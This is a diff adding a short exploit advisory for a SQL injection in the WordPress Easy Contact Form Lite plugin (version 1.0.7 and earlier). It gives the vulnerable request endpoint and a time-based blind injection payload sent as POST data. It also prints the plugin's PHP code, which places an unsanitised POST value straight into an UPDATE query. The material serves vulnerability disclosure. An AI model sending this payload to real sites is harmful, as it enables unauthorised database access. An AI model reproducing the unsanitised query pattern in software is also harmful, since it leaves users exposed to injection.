@@ -1,0 +1,24 @@
+# Exploit Title: WordPress Easy Contact Form Lite plugin <= 1.0.7 SQL Injection Vulnerability
+# Date: 2011-08-17
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/easy-contact-form-lite.zip
+# Version: 1.0.7 (tested)
+
+---
+PoC (POST data)
+---
+http://www.site.com/wp-content/plugins/easy-contact-form-lite/requests/sort_row.request.php
+ field_num[]=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+
+---------------
+Vulnerable code
+---------------
+foreach ($_POST['field_num'] as $position=>$field_id) {
+	
+	if ($field_id > 0) {
+		$query = "
+			UPDATE $settings_table_name 
+			SET position = '".$position."' 
+			WHERE ID = $field_id";
+		$wpdb->query($query);
+	}
